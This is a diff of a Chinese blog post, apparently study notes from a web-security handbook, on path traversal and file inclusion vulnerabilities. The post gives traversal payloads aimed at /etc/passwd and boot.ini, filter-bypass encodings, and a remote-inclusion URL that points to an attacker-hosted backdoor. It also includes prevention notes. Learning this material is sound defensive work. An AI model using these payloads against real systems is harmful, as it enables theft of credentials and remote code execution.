@@ -120,7 +120,55 @@
 <p>执行命令使用命令 API 而不是传入字符串给 shell 执行。</p>
 <h5 id="防止脚本注入漏洞"><a href="#防止脚本注入漏洞" class="headerlink" title="防止脚本注入漏洞"></a>防止脚本注入漏洞</h5><p>最好不要把用户的输入传入动态执行函数中。不可避免的场景下，使用白名单。</p>
 <h4 id="操作文件路径"><a href="#操作文件路径" class="headerlink" title="操作文件路径"></a>操作文件路径</h4><p>有很多功能都需要把用户输入的参数当作文件名或目录名。</p>
-<h5 id="路径遍历漏洞"><a href="#路径遍历漏洞" class="headerlink" title="路径遍历漏洞"></a>路径遍历漏洞</h5>
+<h5 id="路径遍历漏洞"><a href="#路径遍历漏洞" class="headerlink" title="路径遍历漏洞"></a>路径遍历漏洞</h5><p>路径遍历漏洞：应用使用用户控制的数据访问文件或目录，处理不当，会导致用户可以访问敏感信息。</p>
+<h5 id="寻找路径遍历漏洞"><a href="#寻找路径遍历漏洞" class="headerlink" title="寻找路径遍历漏洞"></a>寻找路径遍历漏洞</h5><h6 id="定位攻击目标"><a href="#定位攻击目标" class="headerlink" title="定位攻击目标"></a>定位攻击目标</h6><p>任何涉及上传和下载文件的功能都要认真对待。在相关参数插入 / \ 进行测试。</p>
+<h6 id="定位路径遍历漏洞"><a href="#定位路径遍历漏洞" class="headerlink" title="定位路径遍历漏洞"></a>定位路径遍历漏洞</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;foo&#x2F;file1.txt</span><br><span class="line">file&#x3D;foo&#x2F;bar&#x2F;..&#x2F;file1.txt</span><br></pre></td></tr></table></figure>
+
+<p>如果依然正确返回，说明有戏</p>
+<p>继续尝试访问操作系统公共文件</p>
+<h6 id="规避障碍"><a href="#规避障碍" class="headerlink" title="规避障碍"></a>规避障碍</h6><p>hack steps，绕过 / \ 限制</p>
+<ol>
+<li><p>尝试使用两种斜线 / \ ，很多文件系统两种都支持</p>
+</li>
+<li><p>使用 URL 编码</p>
+</li>
+<li><p>使用 UTF-16 编码</p>
+</li>
+<li><p>双重 URL 编码</p>
+</li>
+<li><p>UTF-8 编码</p>
+</li>
+<li><pre><code>....//
+....\/
+..../\
+....\\
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">hack steps 绕过文件类型限制</span><br><span class="line"></span><br><span class="line">1.</span><br></pre></td></tr></table></figure>
+../../../../../boot.ini%00.jpg
+java 允许字符串中包含 null
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2.</span><br></pre></td></tr></table></figure>
+检查路径开始于特定子目录，容易绕过
+filestore/../../../../../../../etc/passwd
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">###### 处理自定义编码</span><br><span class="line"></span><br><span class="line">##### 利用路径遍历漏洞</span><br><span class="line"></span><br><span class="line">hack steps</span><br><span class="line"></span><br><span class="line">读权限：</span><br><span class="line"></span><br><span class="line">- 密码文件</span><br><span class="line">- 应用配置文件</span><br><span class="line">- 可能包含数据库凭证的 include 文件</span><br><span class="line">- 应用使用的数据文件，包括数据库文件，xml 文件</span><br><span class="line">- 源代码</span><br><span class="line">- 日志文件</span><br><span class="line"></span><br><span class="line">写权限：</span><br><span class="line"></span><br><span class="line">- 各种脚本</span><br><span class="line"></span><br><span class="line">##### 防止路径遍历漏洞</span><br><span class="line"></span><br><span class="line">尽量不要把用户的参数当作路径；如果不可避免，如果检测的非法字符，拒绝该请求。</span><br><span class="line"></span><br><span class="line">##### 文件包含漏洞</span><br><span class="line"></span><br><span class="line">PHP 包含文件</span><br><span class="line"></span><br><span class="line">###### 远程文件包含</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">https:&#x2F;&#x2F;wahh-app.com&#x2F;main.php?Country&#x3D;US</span><br><span class="line">$country &#x3D; $_GET[‘Country’];</span><br><span class="line">include( $country . ‘.php’ );</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;wahh-app.com&#x2F;main.php?Country&#x3D;http:&#x2F;&#x2F;wahh-attacker.com&#x2F;backdoor</span><br></pre></td></tr></table></figure>
+</code></pre></li>
+</ol>
+<h6 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h6><ul>
+<li>包含高权限可执行代码</li>
+<li>包含静态文件</li>
+</ul>
+<h5 id="寻找文件包含漏洞"><a href="#寻找文件包含漏洞" class="headerlink" title="寻找文件包含漏洞"></a>寻找文件包含漏洞</h5><p>远程文件包含漏洞</p>
+<ol>
+<li>参数替换成自己可以控制的 URL</li>
+<li>参数替换成非法 URL，观察是否出现延时</li>
+<li>如果出现文件包含漏洞，上传恶意脚本</li>
+</ol>
+<p>本地文件包含漏洞</p>
+<ol>
+<li>上传已知名字的本地可执行文件</li>
+<li>上传已知名字的静态资源文件</li>
+<li>尝试获取敏感信息</li>
+<li>尝试之前的路径遍历</li>
+</ol>
+<h4 id="注入-XML"><a href="#注入-XML" class="headerlink" title="注入 XML"></a>注入 XML</h4><h4 id="注入后端-HTTP-请求"><a href="#注入后端-HTTP-请求" class="headerlink" title="注入后端 HTTP 请求"></a>注入后端 HTTP 请求</h4><h4 id="注入邮件服务"><a href="#注入邮件服务" class="headerlink" title="注入邮件服务"></a>注入邮件服务</h4>
       
     </div>
     <footer class="article-footer">
